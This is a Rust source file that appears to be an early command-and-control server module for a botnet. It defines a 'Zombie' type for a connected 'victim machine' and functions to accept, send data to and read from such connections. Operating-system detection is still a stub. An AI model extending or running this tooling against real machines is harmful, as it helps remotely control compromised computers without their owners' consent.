use std::fmt::Debug;
use std::io::{Error, Read, Write};
use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
use std::time::Duration;
use log::{debug, error, trace};

// TODO: Move to config
const BUFFER_SIZE: usize = 1024;

#[derive(Debug)]
pub enum System {
    Windows,
    Linux,
    MacOS,
    NotFound
}

/// Zombie is victim machine.
#[derive(Debug)]
pub struct Zombie {
    pub system: System,
    pub ip: IpAddr,
    pub port: u16,
    pub alive: bool,
    tcp_stream: TcpStream
}

/// TODO: Find system after connection
fn find_system(connection: &mut TcpStream) -> System {
    System::NotFound // Not implemented yet
}

impl Zombie {
    pub fn build(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
        Ok(
            Zombie {
                system: find_system(&mut connection),
                ip: connection.peer_addr()?.ip(),
                port: connection.peer_addr()?.port(),
                alive: true,
                tcp_stream: connection
            }
        )
    }

    pub fn send_data(&mut self, data: &[u8]) {
        match self.tcp_stream.write(data) {
            Ok(size) => trace!("Written {size} bytes!"),
            Err(e) => error!("Error writing to zombie!\n{e}")
        };
    }

    pub fn recv(&mut self) -> Option<String> {
        let mut data: Vec<u8> = vec![0; BUFFER_SIZE];
        self.tcp_stream.read(&mut data).expect("TODO: panic message");
        Some(
            String::from_utf8(data).expect("TODO: panic message")
        )
    }
}



pub fn craft_zombie(connection: TcpStream) -> Option<Zombie> {
    debug!("Caught connection! {connection:?}");

    match Zombie::build(connection) {
        Ok(Zombie) => Some(Zombie),
        Err(e) => {
            error!("Error occurred when crafting the zombie: {}", e);
            None
        }
    }
}